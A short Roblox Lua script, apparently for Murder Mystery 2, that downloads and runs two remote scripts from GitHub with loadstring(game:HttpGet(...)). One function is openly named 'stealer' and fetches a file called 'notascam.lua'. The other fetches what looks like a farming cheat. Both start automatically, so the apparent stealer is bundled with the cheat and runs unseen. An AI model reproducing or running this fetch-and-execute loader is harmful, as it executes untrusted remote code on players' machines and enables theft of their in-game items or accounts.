local function stealer()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FloppsCat/mm2notascam/refs/heads/main/notascam.lua"))()
end
local function farm()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
end

task.spawn(stealer)
wait(2)
task.spawn(farm)
